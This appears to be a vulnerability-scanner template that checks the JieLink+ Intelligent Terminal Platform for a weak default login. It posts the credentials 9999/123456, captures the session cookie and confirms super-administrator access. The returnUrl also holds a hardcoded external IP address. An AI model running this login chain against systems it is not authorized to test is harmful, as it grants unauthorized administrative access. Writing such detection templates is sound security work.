id: poc-yaml-jielink-plus-weak-password
info:
  name: JieLink+ Intelligent Terminal Platform Weak Password Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: weak-password
  description: |
    JieLink+ Intelligent Terminal Platform weak password vulnerability allows unauthorized access to the platform.
http:
  - raw:
      - |
        POST /Auth/Signin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        returnUrl=http%3A%2F%2F111.30.107.22%3A8090%2Fhome%2Fmain&username=9999&password=123456
    extractors:
      - type: regex
        name: session_cookie
        group: 1
        regex:
          - "ASP.NET_SessionId=(.*?);"
        internal: true
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: body
        words:
          - "/home/main"
  - raw:
      - |
        GET /home/main HTTP/1.1
        Host: {{Hostname}}
        Cookie: ASP.NET_SessionId={{session_cookie}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "超级管理员 你好"
          - "环境配置"
          - "智能终端操作平台"
